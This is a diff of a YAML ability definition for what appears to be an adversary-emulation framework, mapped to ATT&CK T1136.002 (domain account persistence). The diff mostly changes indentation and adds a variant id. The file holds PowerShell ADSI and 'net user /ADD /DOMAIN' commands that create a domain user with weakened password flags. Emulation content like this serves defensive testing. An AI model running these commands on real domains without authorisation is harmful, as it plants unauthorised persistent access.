@@ -3,9 +3,9 @@ name: Create Domain User
 description: Creates a new Domain User using the creds of the Current User
 metadata:
   authors:
-    - w0rk3r
+  - w0rk3r
   tags:
-    - destructive
+  - destructive
 tactic: persistence
 technique:
   id: T1136.002
@@ -28,14 +28,15 @@ platforms:
         $User.Save()
         $User
       variants:
-        - command: |
-            $Domain = #{persistence.domain}
-            [ADSI]$DN = "LDAP://CN=Users," + ([ADSI]"LDAP://$Domain").distinguishedName
-            $new = $DN.Create("user","CN=#{persistence.local.new.user.name}")
-            $new.put("samaccountname","#{persistence.local.new.user.name}")
-            $new.setinfo()
-            $new.put("userAccountControl",544)
-            $new.setpassword("#{persistence.local.new.user.password}")
+      - command: |
+          $Domain = #{persistence.domain}
+          [ADSI]$DN = "LDAP://CN=Users," + ([ADSI]"LDAP://$Domain").distinguishedName
+          $new = $DN.Create("user","CN=#{persistence.local.new.user.name}")
+          $new.put("samaccountname","#{persistence.local.new.user.name}")
+          $new.setinfo()
+          $new.put("userAccountControl",544)
+          $new.setpassword("#{persistence.local.new.user.password}")
+        id: ccfe55f9-b01c-4497-b885-78d9e2481760
     cmd:
       command: |
         net user #{persistence.local.new.user.name} #{persistence.local.new.user.password} /ADD /DOMAIN
